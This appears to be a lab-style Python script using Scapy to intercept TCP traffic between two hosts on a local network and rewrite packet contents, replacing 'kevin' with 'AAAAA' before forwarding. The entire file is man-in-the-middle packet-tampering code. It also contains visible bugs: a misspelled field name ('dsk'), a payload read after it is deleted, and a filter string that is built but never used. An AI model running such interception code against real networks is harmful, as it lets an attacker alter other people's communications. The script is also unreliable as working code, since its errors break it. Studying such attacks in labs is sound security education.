#!/usr/bin/python
from scapy.all import *

# Machine A's informaton
IP_A = "192.168.60.2"
MAC_A = "02:42:c0:a8:3c:02"

# Machine B's informaton
IP_B = "10.0.2.7"
MAC_B = "02:42:8a:d1:b5:73"

# Attacker Machine's informaton
IP_M = "192.168.60.3"
MAC_M = "02:42:c0:a8:3c:03"


def spoof_pkt(pkt):
    if pkt[IP].src == IP_A and pkt[IP].dsk == IP_B and pkt[TCP].payload:
        newpkt = pkt
        del newpkt.chksum
        del newpkt[TCP].payload
        del newpkt[TCP].chksum
        data = pkt[TCP].payload.load
        newdata = data.replace(b"kevin", b"AAAAA")
        send(newpkt / newdata)
    elif pkt[IP].src == IP_B and pkt[IP].dst == IP_A:
        newpkt = pkt[IP]
        send(newpkt)


f = 'tcp and (ether src ' + MAC_A + ' or ' + 'ether src ' + MAC_B + ' )'
pkt = sniff(filter="tcp", prn=spoof_pkt)
